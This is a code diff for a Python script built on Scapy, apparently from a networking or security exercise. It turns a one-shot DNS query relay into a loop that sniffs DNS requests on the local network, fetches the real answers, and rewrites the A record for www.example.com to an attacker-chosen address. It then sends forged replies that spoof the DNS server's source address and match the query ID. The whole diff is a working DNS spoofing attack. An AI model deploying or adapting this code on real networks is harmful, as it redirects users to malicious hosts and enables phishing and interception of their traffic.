@@ -1,21 +1,23 @@
 from scapy.config import conf
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
-from scapy.sendrecv import sr1, sniff
+from scapy.sendrecv import sr1, sniff, send
 
 interface = conf.iface
+while True:
+    p = sniff(count = 1, lfilter = lambda pac: DNS in pac and pac[DNS].qr == 0, iface = interface)
+    p = p[0]
 
-p = sniff(count = 1, lfilter = lambda pac: DNS in pac and pac[DNS].qr == 0, iface = interface)
-p = p[0]
-domain = p[DNSQR].qname
-ip_DNS_server = p[IP].dst
-d_type = p[DNSQR].qtype
-s = (IP(dst=ip_DNS_server)
-     / UDP(dport=53)
-     / DNS(rd=1, qd=DNSQR(qname=domain, qtype = d_type)))
-
-dns_answer = sr1(s, timeout=5, verbose=False)
-if dns_answer:
-    dns_answer =
-
-
+    s = IP(dst = p[IP].dst) /UDP(dport = p[UDP].dport) /DNS(qr =0, rd=1, qd=p[DNS].qd)
+    dns_answer = sr1(s, timeout=2, verbose=False)
+    if dns_answer:
+        #r = IP(dst = p[IP].src, src = p[IP].dst) /UDP(sport = p[UDP].dport, dport = p[UDP].sport) /DNS(qr = 1, id = p[DNS].id, ra=1, qd=s[DNS].qd, an = dns_answer[DNS].an)
+        #'''
+        if DNS in dns_answer:
+            ans =  dns_answer[DNS].an
+        for answer in ans:
+            if answer.type == 1 and b"www.example.com" in answer.rrname:
+                answer.rdata = "100.160.51.123"
+        r = IP(dst = p[IP].src, src = p[IP].dst) /UDP(sport = p[UDP].dport, dport = p[UDP].sport) /DNS(qr = 1, id = p[DNS].id, ra=1, qd=s[DNS].qd, an = ans, ar = dns_answer[DNS].ar, ns = dns_answer[DNS].ns)
+        # '''
+        send(r)
